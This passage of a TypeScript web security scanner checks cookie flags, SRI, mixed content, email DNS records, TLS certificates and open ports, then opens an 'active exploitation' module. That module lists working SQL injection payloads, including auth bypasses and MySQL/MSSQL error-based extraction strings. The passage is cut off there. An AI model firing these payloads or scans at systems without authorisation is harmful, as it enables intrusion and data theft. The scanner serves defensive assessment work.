      references: [],
      evidence: `Server responded with HTTP ${result.status}`,
      category: "Server Configuration",
    }));
  }

  // ── Cookie Security Analysis ──
  const setCookie = result.headers["set-cookie"] || "";
  if (setCookie) {
    if (!setCookie.toLowerCase().includes("httponly")) {
      findings.push(makeFinding({
        title: "Cookie Missing HttpOnly Flag",
        description: "Cookies are set without the HttpOnly attribute. JavaScript can access these cookies via document.cookie, making them vulnerable to theft via XSS attacks.",
        severity: "medium", cvss_score: 5.3,
        impact: "Session cookies can be stolen via XSS — enables session hijacking",
        likelihood: "Medium — requires XSS vulnerability to exploit",
        remediation: "Set HttpOnly flag on all session and authentication cookies",
        references: ["https://owasp.org/www-community/HttpOnly"],
        evidence: `Set-Cookie header present without HttpOnly: ${setCookie.slice(0, 150)}`,
        category: "Security Headers",
      }));
    }
    if (!setCookie.toLowerCase().includes("secure") && baseUrl.startsWith("https://")) {
      findings.push(makeFinding({
        title: "Cookie Missing Secure Flag on HTTPS Site",
        description: "Cookies on this HTTPS site are set without the Secure attribute. These cookies will also be sent over unencrypted HTTP connections, exposing them to interception.",
        severity: "medium", cvss_score: 5.4,
        impact: "Cookie theft via network interception when user visits HTTP version",
        likelihood: "Medium",
        remediation: "Set Secure flag on all cookies for HTTPS sites",
        references: ["https://owasp.org/www-community/controls/SecureCookieAttribute"],
        evidence: `Set-Cookie on HTTPS without Secure flag: ${setCookie.slice(0, 150)}`,
        category: "Security Headers",
      }));
    }
    if (!setCookie.toLowerCase().includes("samesite")) {
      findings.push(makeFinding({
        title: "Cookie Missing SameSite Attribute",
        description: "Cookies are set without the SameSite attribute. This makes them vulnerable to Cross-Site Request Forgery (CSRF) attacks.",
        severity: "low", cvss_score: 4.3,
        impact: "CSRF attacks possible — unauthorized actions performed on behalf of authenticated users",
        likelihood: "Medium",
        remediation: "Set SameSite=Strict or SameSite=Lax on all cookies",
        references: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite"],
        evidence: `Set-Cookie without SameSite: ${setCookie.slice(0, 150)}`,
        category: "Security Headers",
      }));
    }
  }

  // ── Subresource Integrity (SRI) Check ──
  if (result.body) {
    const externalScripts = [...result.body.matchAll(/<script[^>]*\bsrc\s*=\s*["'](https?:\/\/[^"']+)["'][^>]*>/gi)];
    const scriptsWithoutSRI = externalScripts.filter(m => !m[0].toLowerCase().includes("integrity="));
    if (scriptsWithoutSRI.length >= 2) {
      findings.push(makeFinding({
        title: `${scriptsWithoutSRI.length} External Scripts Without Subresource Integrity (SRI)`,
        description: `Found ${scriptsWithoutSRI.length} external scripts loaded without SRI hashes. If the CDN is compromised, attackers can inject malicious code that your page will execute without verification.`,
        severity: "medium", cvss_score: 5.8,
        impact: "CDN compromise or DNS hijack leads to execution of attacker-controlled JavaScript",
        likelihood: "Medium — depends on CDN security posture",
        remediation: "Add integrity=\"sha384-...\" and crossorigin=\"anonymous\" to all external script tags",
        references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity"],
        evidence: `${scriptsWithoutSRI.length} scripts without SRI. Sample: ${(scriptsWithoutSRI[0]?.[1] || "").slice(0, 120)}`,
        category: "Client-Side Security",
      }));
    }
  }

  // ── Mixed Content in HTML ──
  if (baseUrl.startsWith("https://") && result.body) {
    const httpResources = [
      ...result.body.matchAll(/(?:src|href|action)\s*=\s*["'](http:\/\/[^"']+)["']/gi)
    ].map(m => m[1]);
    if (httpResources.length > 0) {
      findings.push(makeFinding({
        title: `Mixed Content: ${httpResources.length} HTTP Resources on HTTPS Page`,
        description: `The HTTPS page loads ${httpResources.length} resource(s) over unencrypted HTTP. Modern browsers block mixed active content and warn about mixed passive content.`,
        severity: "medium", cvss_score: 5.0,
        impact: "HTTP resources can be intercepted and modified by MITM attackers, injecting malicious content",
        likelihood: "Medium — browsers may block resources, breaking functionality",
        remediation: "Change all resource URLs to HTTPS. Add CSP upgrade-insecure-requests directive",
        references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content"],
        evidence: `HTTP resources on HTTPS page: ${httpResources.slice(0, 3).join(", ").slice(0, 200)}`,
        category: "SSL/TLS",
      }));
    }
  }

  // ── HTTP-to-HTTPS Redirect Check ──
  if (baseUrl.startsWith("https://")) {
    try {
      const httpUrl = baseUrl.replace("https://", "http://");
      const ctrl = new AbortController();
      const redirectTimer = setTimeout(() => ctrl.abort(), 6000);
      const httpRes = await fetch(httpUrl, {
        method: "HEAD",
        redirect: "manual",
        signal: ctrl.signal,
        headers: { "User-Agent": "SecureNetScanner/1.0" },
      });
      clearTimeout(redirectTimer);
      const loc = httpRes.headers.get("location") || "";
      if (httpRes.status === 200) {
        findings.push(makeFinding({
          title: "HTTP Does Not Redirect to HTTPS",
          description: "The HTTP version of this site serves content directly instead of redirecting to HTTPS. Users who type the domain without https:// will connect insecurely.",
          severity: "high", cvss_score: 7.0,
          impact: "Users can be served insecure content — vulnerable to MITM and SSL stripping",
          likelihood: "High — many users omit https:// when typing URLs",
          remediation: "Configure a 301 redirect from HTTP to HTTPS on all paths",
          references: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections"],
          evidence: `GET ${httpUrl} returned HTTP ${httpRes.status} (no redirect to HTTPS)`,
          category: "SSL/TLS",
        }));
      } else if ([301, 302, 307, 308].includes(httpRes.status) && !loc.startsWith("https://")) {
        findings.push(makeFinding({
          title: "HTTP Redirects to Non-HTTPS Location",
          description: `HTTP redirects to ${loc} which is not HTTPS. The redirect chain does not enforce encryption.`,
          severity: "medium", cvss_score: 5.5,
          impact: "Redirect does not enforce HTTPS — MITM can intercept the redirect",
          likelihood: "Medium",
          remediation: "Ensure HTTP redirects directly to the HTTPS version of the URL",
          references: [],
          evidence: `GET ${httpUrl} → ${httpRes.status} → ${loc}`,
          category: "SSL/TLS",
        }));
      }
    } catch { /* ignore */ }
  }

  // ── Security.txt Check ──
  try {
    const base = baseUrl.replace(/\/$/, "");
    const ctrl = new AbortController();
    const secTxtTimer = setTimeout(() => ctrl.abort(), 6000);
    const secTxtRes = await fetch(`${base}/.well-known/security.txt`, {
      signal: ctrl.signal,
      headers: { "User-Agent": "SecureNetScanner/1.0" },
    });
    clearTimeout(secTxtTimer);
    if (secTxtRes.status !== 200) {
      findings.push(makeFinding({
        title: "Missing security.txt",
        description: "No security.txt file found at /.well-known/security.txt. This file helps security researchers responsibly report vulnerabilities.",
        severity: "info", cvss_score: 0,
        impact: "Security researchers may not have a clear channel to report vulnerabilities",
        likelihood: "Info — best practice recommendation",
        remediation: "Create /.well-known/security.txt with Contact, Expires, and Preferred-Languages fields per RFC 9116",
        references: ["https://securitytxt.org/", "https://datatracker.ietf.org/doc/html/rfc9116"],
        evidence: `GET ${base}/.well-known/security.txt returned HTTP ${secTxtRes.status}`,
        category: "Server Configuration",
      }));
    }
  } catch { /* ignore */ }

  // ── Form Action Security ──
  if (result.body) {
    const formActions = [...result.body.matchAll(/<form[^>]*\baction\s*=\s*["'](https?:\/\/[^"']+)["']/gi)];
    for (const match of formActions) {
      const actionUrl = match[1];
      if (actionUrl.startsWith("http://") && baseUrl.startsWith("https://")) {
        findings.push(makeFinding({
          title: "Form Submits Data Over HTTP",
          description: `A form on this HTTPS page submits data to an insecure HTTP endpoint: ${actionUrl}. Form data including passwords will be sent unencrypted.`,
          severity: "high", cvss_score: 7.5,
          impact: "Form data (passwords, personal info) sent in plaintext — interceptable by MITM",
          likelihood: "High — data submitted without encryption",
          remediation: "Change form action to HTTPS URL",
          references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content"],
          evidence: `Form action: ${actionUrl}`,
          category: "SSL/TLS",
        }));
        break;
      }
      try {
        const baseHost = new URL(baseUrl).hostname;
        const actionHost = new URL(actionUrl).hostname;
        if (!actionHost.endsWith(baseHost) && !baseHost.endsWith(actionHost)) {
          findings.push(makeFinding({
            title: "Form Submits Data to External Domain",
            description: `A form submits data to ${actionHost} which is a different domain from ${baseHost}. This could indicate data exfiltration or a phishing compromise.`,
            severity: "medium", cvss_score: 5.5,
            impact: "Form data sent to third party — potential data exfiltration",
            likelihood: "Medium — may be legitimate (payment processor, etc.)",
            remediation: "Verify the external form action is intentional and points to a trusted service",
            references: [],
            evidence: `Form action: ${actionUrl} (external to ${baseHost})`,
            category: "Suspicious Behavior",
          }));
          break;
        }
      } catch { /* ignore */ }
    }
  }

  return findings;
}

// ── Module 6: DNS Security Analysis ──────────────────────────────────────────

async function analyzeDNS(hostname: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  try {
    const dnsModule = await import("dns");
    const resolver = new dnsModule.promises.Resolver();
    resolver.setServers(["8.8.8.8", "8.8.4.4", "1.1.1.1"]);

    // ─ SPF ─
    let hasTxt = false;
    try {
      const txtRecords = await resolver.resolveTxt(hostname);
      hasTxt = true;
      const flat = txtRecords.map((r: string[]) => r.join(""));
      const spf = flat.find((r: string) => r.toLowerCase().startsWith("v=spf1"));
      if (!spf) {
        findings.push(makeFinding({
          title: "Missing SPF Record",
          description: `No SPF record found for ${hostname}. Attackers can spoof emails from your domain for phishing.`,
          severity: "high", cvss_score: 7.4,
          impact: "Email spoofing and phishing using your domain identity",
          likelihood: "High — trivially exploitable",
          remediation: "Add TXT record: v=spf1 include:_spf.google.com ~all (adjust for your mail providers)",
          references: ["https://datatracker.ietf.org/doc/html/rfc7208", "https://dmarcian.com/spf-survey/"],
          evidence: `DNS TXT query for ${hostname} returned no v=spf1 record`,
          category: "DNS Security",
        }));
      } else if (spf.includes("+all")) {
        findings.push(makeFinding({
          title: "Dangerously Permissive SPF Record (+all)",
          description: `SPF uses "+all" — ANY server is authorized to send email as ${hostname}. This completely defeats SPF.`,
          severity: "critical", cvss_score: 9.3,
          impact: "Any attacker can send fully SPF-validated spoofed emails",
          likelihood: "Critical — explicitly permits all senders",
          remediation: "Change +all to -all (hard fail) or ~all (soft fail)",
          references: ["https://datatracker.ietf.org/doc/html/rfc7208#section-5.1"],
          evidence: `SPF Record: ${spf}`, category: "DNS Security",
        }));
      } else if (spf.includes("?all")) {
        findings.push(makeFinding({
          title: "Weak SPF Record (?all — Neutral)",
          description: `SPF uses "?all" (neutral) providing no real protection against spoofing.`,
          severity: "medium", cvss_score: 5.3,
          impact: "SPF neutral result — most systems accept unauthorized emails",
          likelihood: "Medium",
          remediation: "Change ?all to ~all or -all",
          references: ["https://datatracker.ietf.org/doc/html/rfc7208"],
          evidence: `SPF Record: ${spf}`, category: "DNS Security",
        }));
      }
    } catch {
      findings.push(makeFinding({
        title: "No DNS TXT Records Found",
        description: `No TXT records for ${hostname}. SPF, DKIM, and DMARC are not configured.`,
        severity: "high", cvss_score: 7.0,
        impact: "No email authentication — domain is fully spoofable",
        likelihood: "High",
        remediation: "Configure SPF, DKIM, and DMARC TXT records",
        references: ["https://support.google.com/a/answer/33786"],
        evidence: `DNS TXT query for ${hostname} failed`, category: "DNS Security",
      }));
    }

    // ─ DMARC ─
    try {
      const dmarcRecords = await resolver.resolveTxt(`_dmarc.${hostname}`);
      const dmarcFlat = dmarcRecords.map((r: string[]) => r.join(""));
      const dmarc = dmarcFlat.find((r: string) => r.toLowerCase().startsWith("v=dmarc1"));
      if (!dmarc) {
        findings.push(makeFinding({
          title: "Missing DMARC Record",
          description: `No DMARC record at _dmarc.${hostname}. Spoofed emails that fail SPF/DKIM will still be delivered.`,
          severity: "high", cvss_score: 7.1,
          impact: "No enforcement for failed email authentication",
          likelihood: "High",
          remediation: "Add TXT: _dmarc.yourdomain.com → v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com",
          references: ["https://dmarc.org/overview/", "https://datatracker.ietf.org/doc/html/rfc7489"],
          evidence: `_dmarc.${hostname} — no DMARC record`, category: "DNS Security",
        }));
      } else if (/p\s*=\s*none/i.test(dmarc)) {
        findings.push(makeFinding({
          title: "DMARC Policy Set to 'None' (Monitor Only)",
          description: `DMARC policy p=none only monitors — spoofed emails are reported but still delivered.`,
          severity: "medium", cvss_score: 5.8,
          impact: "Spoofed emails still reach recipients",
          likelihood: "Medium",
          remediation: "Transition from p=none → p=quarantine → p=reject",
          references: ["https://dmarc.org/overview/"],
          evidence: `DMARC: ${dmarc}`, category: "DNS Security",
        }));
      }
    } catch {
      findings.push(makeFinding({
        title: "Missing DMARC Record",
        description: `No DMARC record found at _dmarc.${hostname}.`,
        severity: "high", cvss_score: 7.1,
        impact: "No email authentication enforcement policy",
        likelihood: "High",
        remediation: "Add DMARC TXT record with p=reject policy",
        references: ["https://dmarc.org/overview/"],
        evidence: `_dmarc.${hostname} lookup returned no records`, category: "DNS Security",
      }));
    }

    // ─ DKIM (common selectors) ─
    const selectors = ["default", "google", "selector1", "selector2", "k1", "mail", "dkim", "s1", "s2", "mg", "smtp", "mandrill", "cm", "protonmail", "mimecast"];
    let dkimFound = false;
    for (const sel of selectors) {
      try {
        const recs = await resolver.resolveTxt(`${sel}._domainkey.${hostname}`);
        const flat = recs.map((r: string[]) => r.join(""));
        if (flat.some((r: string) => r.includes("v=DKIM1") || r.includes("k=rsa") || r.includes("p="))) {
          dkimFound = true; break;
        }
      } catch { /* selector not found */ }
    }
    if (!dkimFound) {
      findings.push(makeFinding({
        title: "No DKIM Records Found",
        description: `No DKIM records found across ${selectors.length} common selectors for ${hostname}. Email integrity cannot be cryptographically verified.`,
        severity: "medium", cvss_score: 5.5,
        impact: "Emails cannot be verified for integrity — spoofing more effective",
        likelihood: "Medium — may use a non-standard selector",
        remediation: "Configure DKIM signing and publish the public key TXT record",
        references: ["https://datatracker.ietf.org/doc/html/rfc6376"],
        evidence: `Checked selectors: ${selectors.join(", ")} — none valid`, category: "DNS Security",
      }));
    }

    // ─ DNSSEC (via DNS-over-HTTPS) ─
    try {
      const ctrl = new AbortController();
      const dnssecTimer = setTimeout(() => ctrl.abort(), 5000);
      const doh = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(hostname)}&type=A&do=1`, { signal: ctrl.signal });
      clearTimeout(dnssecTimer);
      const data = await doh.json() as { AD?: boolean };
      if (!data.AD) {
        findings.push(makeFinding({
          title: "DNSSEC Not Enabled",
          description: `DNSSEC is not enabled for ${hostname}. DNS responses can be forged via cache poisoning.`,
          severity: "medium", cvss_score: 5.9,
          impact: "DNS spoofing and cache poisoning attacks possible",
          likelihood: "Medium — requires network-level attacker",
          remediation: "Enable DNSSEC signing at your registrar or DNS provider",
          references: ["https://www.cloudflare.com/dns/dnssec/how-dnssec-works/"],
          evidence: `DNS-over-HTTPS: AD (Authenticated Data) flag is NOT set`, category: "DNS Security",
        }));
      }
    } catch { /* skip */ }

    // ─ MX Records ─
    try {
      const mx = await resolver.resolveMx(hostname);
      if (!mx || mx.length === 0) {
        findings.push(makeFinding({
          title: "No MX Records Configured",
          description: `No MX records for ${hostname}. Consider adding a null MX (RFC 7505) if this domain should not receive email.`,
          severity: "info", cvss_score: 0,
          impact: "Email delivery misconfiguration",
          likelihood: "Info",
          remediation: "Add null MX record if domain shouldn't receive email: MX 0 .",
          references: ["https://datatracker.ietf.org/doc/html/rfc7505"],
          evidence: `MX query for ${hostname} returned 0 records`, category: "DNS Security",
        }));
      }
    } catch { /* ignore */ }

  } catch (err) {
    findings.push(makeFinding({
      title: "DNS Analysis Module Error",
      description: `DNS analysis failed: ${err instanceof Error ? err.message : String(err)}`,
      severity: "info", cvss_score: 0,
      impact: "DNS analysis incomplete", likelihood: "N/A",
      remediation: "Ensure the domain resolves correctly",
      references: [], evidence: `Error: ${err instanceof Error ? err.message : String(err)}`, category: "DNS Security",
    }));
  }
  return findings;
}

// ── Module 7: TLS Certificate Deep Inspection ────────────────────────────────

async function analyzeTLSDeep(hostname: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  try {
    const tlsModule = await import("tls");
    await new Promise<void>((resolve) => {
      const socket = tlsModule.connect({
        host: hostname, port: 443, servername: hostname,
        rejectUnauthorized: false, // inspect even bad certs
      }, () => {
        try {
          const cert = socket.getPeerCertificate(true);
          const cipher = socket.getCipher();
          const protocol = socket.getProtocol();

          if (cert && cert.subject) {
            // Expiry check
            const validTo = new Date(cert.valid_to);
            const validFrom = new Date(cert.valid_from);
            const now = new Date();
            const daysLeft = Math.floor((validTo.getTime() - now.getTime()) / 86400000);

            if (daysLeft < 0) {
              findings.push(makeFinding({
                title: "SSL Certificate Has Expired",
                description: `The certificate expired ${Math.abs(daysLeft)} days ago on ${validTo.toISOString().split("T")[0]}. Browsers will show security warnings and block access.`,
                severity: "critical", cvss_score: 9.4,
                impact: "Users see security warnings — complete loss of trust and HTTPS protection",
                likelihood: "Critical — certificate is already expired",
                remediation: "Immediately renew the SSL certificate. Use Let's Encrypt for free auto-renewing certs",
                references: ["https://letsencrypt.org/"],
                evidence: `Certificate valid_to: ${cert.valid_to} (expired ${Math.abs(daysLeft)} days ago)`,
                category: "TLS Certificate",
              }));
            } else if (daysLeft <= 30) {
              findings.push(makeFinding({
                title: `SSL Certificate Expiring Soon (${daysLeft} days)`,
                description: `Certificate expires on ${validTo.toISOString().split("T")[0]}. Only ${daysLeft} days remaining.`,
                severity: daysLeft <= 7 ? "high" : "medium",
                cvss_score: daysLeft <= 7 ? 7.5 : 5.0,
                impact: "Imminent certificate expiry will cause service disruption",
                likelihood: "High — expiry is imminent",
                remediation: "Renew the certificate immediately. Set up auto-renewal with Let's Encrypt or your CA",
                references: ["https://letsencrypt.org/docs/"],
                evidence: `Expires: ${cert.valid_to} — ${daysLeft} days remaining`,
                category: "TLS Certificate",
              }));
            }

            // Self-signed check
            const issuerStr = JSON.stringify(cert.issuer || {});
            const subjectStr = JSON.stringify(cert.subject || {});
            if (issuerStr === subjectStr) {
              findings.push(makeFinding({
                title: "Self-Signed SSL Certificate Detected",
                description: "The certificate is self-signed (issuer matches subject). Browsers will display untrusted warnings. Self-signed certs enable man-in-the-middle attacks since there's no third-party trust validation.",
                severity: "high", cvss_score: 7.4,
                impact: "No third-party trust validation — MITM attacks trivially possible",
                likelihood: "High — browsers warn all users",
                remediation: "Replace with a certificate from a trusted CA (Let's Encrypt is free)",
                references: ["https://letsencrypt.org/"],
                evidence: `Issuer: ${cert.issuer?.O || "unknown"} | Subject: ${cert.subject?.O || "unknown"} (match = self-signed)`,
                category: "TLS Certificate",
              }));
            }

            // Weak signature algorithm
            const sigAlg = (cert as unknown as Record<string, unknown>).sigAlgName as string || "";
            if (/sha1|md5/i.test(sigAlg)) {
              findings.push(makeFinding({
                title: "Weak Certificate Signature Algorithm",
                description: `Certificate uses ${sigAlg} which is cryptographically weak and deprecated. Modern browsers may reject it.`,
                severity: "high", cvss_score: 7.1,
                impact: "Signature can potentially be forged — certificate trust is compromised",
                likelihood: "High — known weak algorithm",
                remediation: "Reissue certificate with SHA-256 or stronger signature algorithm",
                references: ["https://shattered.io/"],
                evidence: `Signature algorithm: ${sigAlg}`, category: "TLS Certificate",
              }));
            }

            // Subject Alternative Names check
            const san = cert.subjectaltname || "";
            if (!san.toLowerCase().includes(hostname.toLowerCase())) {
              findings.push(makeFinding({
                title: "Certificate Hostname Mismatch",
                description: `The certificate's Subject Alternative Names do not include ${hostname}. Browsers will show a name mismatch error.`,
                severity: "high", cvss_score: 7.0,
                impact: "Browsers display security warnings — users cannot safely connect",
                likelihood: "High — mismatch is immediately visible",
                remediation: "Reissue the certificate with the correct domain name in the SAN field",
                references: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Errors/SEC_ERROR_BAD_CERT_DOMAIN"],
                evidence: `Hostname: ${hostname} | SAN: ${san.slice(0, 200)}`, category: "TLS Certificate",
              }));
            }

            // Certificate chain depth
            let chainDepth = 0;
            let current = cert;
            while (current && (current as unknown as Record<string, unknown>).issuerCertificate && (current as unknown as Record<string, unknown>).issuerCertificate !== current) {
              chainDepth++;
              current = (current as unknown as Record<string, unknown>).issuerCertificate as typeof cert;
              if (chainDepth > 10) break;
            }
            if (chainDepth > 5) {
              findings.push(makeFinding({
                title: "Unusually Long Certificate Chain",
                description: `Certificate chain has ${chainDepth} intermediates. Long chains slow TLS handshake and may indicate misconfiguration.`,
                severity: "low", cvss_score: 2.0,
                impact: "Slower TLS handshake and potential trust issues",
                likelihood: "Low",
                remediation: "Review certificate chain — remove unnecessary intermediate certificates",
                references: [],
                evidence: `Chain depth: ${chainDepth} certificates`, category: "TLS Certificate",
              }));
            }
          }

          // Cipher suite analysis
          if (cipher) {
            const cipherName = cipher.name || "";
            if (/RC4|DES|NULL|EXPORT|MD5|anon/i.test(cipherName)) {
              findings.push(makeFinding({
                title: "Weak TLS Cipher Suite in Use",
                description: `The server negotiated cipher: ${cipherName}. This cipher has known vulnerabilities and should not be used.`,
                severity: "critical", cvss_score: 9.1,
                impact: "Encrypted traffic can potentially be decrypted by attackers",
                likelihood: "High — known weak cipher",
                remediation: "Disable weak ciphers. Use AEAD ciphers like AES-256-GCM or CHACHA20-POLY1305",
                references: ["https://wiki.mozilla.org/Security/Server_Side_TLS"],
                evidence: `Negotiated cipher: ${cipherName} (version: ${cipher.version || "unknown"})`,
                category: "TLS Certificate",
              }));
            }
          }

          // Protocol version
          if (protocol) {
            if (["SSLv3", "TLSv1", "TLSv1.1"].includes(protocol)) {
              findings.push(makeFinding({
                title: `Deprecated TLS Protocol: ${protocol}`,
                description: `The server uses ${protocol} which is deprecated and has known vulnerabilities (BEAST, POODLE, etc.). Modern browsers may refuse connections.`,
                severity: "high", cvss_score: 7.4,
                impact: "Known protocol vulnerabilities enable traffic decryption",
                likelihood: "High — deprecated protocol actively targeted",
                remediation: "Disable SSLv3, TLSv1, and TLSv1.1. Only allow TLSv1.2 and TLSv1.3",
                references: ["https://datatracker.ietf.org/doc/html/rfc8996"],
                evidence: `Negotiated protocol: ${protocol}`, category: "TLS Certificate",
              }));
            }
          }
        } catch { /* cert parsing error */ }
        socket.end();
        resolve();
      });
      socket.setTimeout(8000);
      socket.on("timeout", () => { socket.destroy(); resolve(); });
      socket.on("error", (err: Error) => {
        if (err.message.includes("self-signed") || err.message.includes("self signed")) {
          findings.push(makeFinding({
            title: "Self-Signed Certificate (Connection Rejected)",
            description: `TLS connection failed: ${err.message}. The certificate is not trusted by any CA.`,
            severity: "high", cvss_score: 7.4,
            impact: "Untrusted certificate — browsers block access",
            likelihood: "High",
            remediation: "Install a certificate from a trusted Certificate Authority",
            references: ["https://letsencrypt.org/"],
            evidence: `TLS error: ${err.message}`, category: "TLS Certificate",
          }));
        } else if (err.message.includes("expired")) {
          findings.push(makeFinding({
            title: "Expired SSL Certificate (Connection Failed)",
            description: `TLS handshake failed due to expired certificate: ${err.message}`,
            severity: "critical", cvss_score: 9.4,
            impact: "Users cannot connect — certificate is expired",
            likelihood: "Critical",
            remediation: "Renew the certificate immediately",
            references: [],
            evidence: `TLS error: ${err.message}`, category: "TLS Certificate",
          }));
        }
        resolve();
      });
    });
  } catch (err) {
    findings.push(makeFinding({
      title: "TLS Inspection Module Error",
      description: `Could not perform deep TLS inspection: ${err instanceof Error ? err.message : String(err)}`,
      severity: "info", cvss_score: 0,
      impact: "TLS analysis incomplete", likelihood: "N/A",
      remediation: "Ensure the server accepts TLS connections on port 443",
      references: [], evidence: `Error: ${err instanceof Error ? err.message : String(err)}`, category: "TLS Certificate",
    }));
  }
  return findings;
}

// ── Module 8: Port Scanning ──────────────────────────────────────────────────

async function scanPorts(hostname: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const netModule = await import("net");

  const portMap: Array<{ port: number; service: string; risk: SeverityLevel; desc: string }> = [
    { port: 21, service: "FTP", risk: "high", desc: "File Transfer Protocol — often unencrypted, credentials sent in plaintext" },
    { port: 22, service: "SSH", risk: "info", desc: "Secure Shell — typically safe but verify authentication methods" },
    { port: 23, service: "Telnet", risk: "critical", desc: "Telnet — completely unencrypted remote access, trivially intercepted" },
    { port: 25, service: "SMTP", risk: "medium", desc: "Mail Transfer — can be used for spam relay if misconfigured" },
    { port: 53, service: "DNS", risk: "low", desc: "DNS server — check for zone transfer vulnerabilities" },
    { port: 110, service: "POP3", risk: "medium", desc: "POP3 mail — credentials often sent unencrypted" },
    { port: 135, service: "MSRPC", risk: "high", desc: "Microsoft RPC — frequent target for Windows exploits" },
    { port: 139, service: "NetBIOS", risk: "high", desc: "NetBIOS Session — enables SMB attacks and enumeration" },
    { port: 143, service: "IMAP", risk: "medium", desc: "IMAP mail — credentials may be sent unencrypted" },
    { port: 445, service: "SMB", risk: "critical", desc: "Server Message Block — target for EternalBlue, WannaCry, and ransomware" },
    { port: 1433, service: "MSSQL", risk: "critical", desc: "Microsoft SQL Server — database directly exposed to internet" },
    { port: 3306, service: "MySQL", risk: "critical", desc: "MySQL database — direct internet exposure enables brute-force and data theft" },
    { port: 3389, service: "RDP", risk: "critical", desc: "Remote Desktop — primary target for ransomware and unauthorized access" },
    { port: 5432, service: "PostgreSQL", risk: "critical", desc: "PostgreSQL database — exposed to internet brute-force attacks" },
    { port: 5900, service: "VNC", risk: "critical", desc: "VNC remote desktop — often weak/no authentication" },
    { port: 6379, service: "Redis", risk: "critical", desc: "Redis — typically no authentication, enables remote code execution" },
    { port: 8080, service: "HTTP-Proxy", risk: "medium", desc: "HTTP proxy/alt — may expose admin interfaces or development servers" },
    { port: 8443, service: "HTTPS-Alt", risk: "low", desc: "Alternative HTTPS — may expose management interfaces" },
    { port: 9200, service: "Elasticsearch", risk: "critical", desc: "Elasticsearch — often unauthenticated, full database read/write access" },
    { port: 27017, service: "MongoDB", risk: "critical", desc: "MongoDB — frequently exposed without authentication" },
  ];

  function probePort(host: string, port: number): Promise<boolean> {
    return new Promise((resolve) => {
      const socket = new netModule.Socket();
      socket.setTimeout(2000);
      socket.on("connect", () => { socket.destroy(); resolve(true); });
      socket.on("timeout", () => { socket.destroy(); resolve(false); });
      socket.on("error", () => { socket.destroy(); resolve(false); });
      socket.connect(port, host);
    });
  }

  const openPorts: typeof portMap = [];
  const chunkSize = 5;
  for (let i = 0; i < portMap.length; i += chunkSize) {
    const chunk = portMap.slice(i, i + chunkSize);
    const results = await Promise.allSettled(
      chunk.map(async (p) => ({ ...p, open: await probePort(hostname, p.port) }))
    );
    for (const r of results) {
      if (r.status === "fulfilled" && r.value.open) {
        openPorts.push(r.value);
      }
    }
  }

  for (const p of openPorts) {
    const dangerPorts = [23, 445, 1433, 3306, 3389, 5432, 5900, 6379, 9200, 27017];
    const sev: SeverityLevel = dangerPorts.includes(p.port) ? "critical" : p.risk;
    const cvss = sev === "critical" ? 9.0 : sev === "high" ? 7.5 : sev === "medium" ? 5.0 : sev === "low" ? 2.5 : 0;

    findings.push(makeFinding({
      title: `Open Port: ${p.port}/${p.service}`,
      description: `Port ${p.port} (${p.service}) is open and accepting connections. ${p.desc}.`,
      severity: sev, cvss_score: cvss,
      impact: sev === "critical" ? "Direct remote exploitation or data theft possible" : "Increased attack surface exposure",
      likelihood: sev === "critical" ? "Critical — actively targeted by automated scanners" : "Medium",
      remediation: `Close port ${p.port} if not needed. If required, restrict access via firewall rules to trusted IPs only`,
      references: ["https://owasp.org/www-project-web-security-testing-guide/"],
      evidence: `TCP connect to ${hostname}:${p.port} — connection accepted (port is open)`,
      category: "Open Ports",
    }));
  }

  if (openPorts.length >= 5) {
    findings.push(makeFinding({
      title: `Excessive Open Ports Detected (${openPorts.length} ports)`,
      description: `Found ${openPorts.length} open ports: ${openPorts.map(p => `${p.port}/${p.service}`).join(", ")}. A large number of open ports significantly increases the attack surface.`,
      severity: "high", cvss_score: 7.0,
      impact: "Large attack surface — multiple potential entry points for attackers",
      likelihood: "High — more services = more potential vulnerabilities",
      remediation: "Apply the principle of least exposure — close all ports not strictly required for operation",
      references: ["https://www.cisa.gov/uscert/ncas/tips/ST04-015"],
      evidence: `${openPorts.length} open ports detected on ${hostname}`, category: "Open Ports",
    }));
  }

  return findings;
}

// ── Module 9: Active Exploitation Testing ────────────────────────────────────

async function testExploitation(baseUrl: string): Promise<Finding[]> {
  const findings: Finding[] = [];
  const base = baseUrl.replace(/\/$/, "");

  // ── Helper: safe fetch with timeout ──
  async function probeFetch(url: string, opts: RequestInit = {}): Promise<{ status: number; headers: Headers; body: string } | null> {
    try {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), 6000);
      const res = await fetch(url, {
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", ...opts.headers as Record<string, string> },
        signal: ctrl.signal, redirect: (opts.redirect || "follow") as RequestRedirect, method: opts.method || "GET",
        body: opts.body,
      });
      clearTimeout(timer);
      let body = "";
      try { body = await res.text(); if (body.length > 500_000) body = body.slice(0, 500_000); } catch { /* ignore */ }
      return { status: res.status, headers: res.headers, body };
    } catch { return null; }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // STAGE 1: SQL INJECTION (Error-based, Boolean-blind, UNION, Stacked)
  // ═══════════════════════════════════════════════════════════════════════════

  const sqliPayloads = [
    // Error-based
    { payload: "' OR '1'='1' --", name: "Classic OR-based", type: "error" },
    { payload: "\" OR \"\"=\"", name: "Double-quote OR", type: "error" },
    { payload: "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", name: "Error-based MSSQL", type: "error" },
    { payload: "' AND extractvalue(1,concat(0x7e,(SELECT version())))--", name: "Error-based MySQL extractvalue", type: "error" },
    { payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", name: "Error-based MySQL double-query", type: "error" },
    { payload: "') OR ('1'='1", name: "Parenthesis bypass", type: "error" },
    { payload: "admin'--", name: "Auth bypass", type: "error" },
    // UNION-based
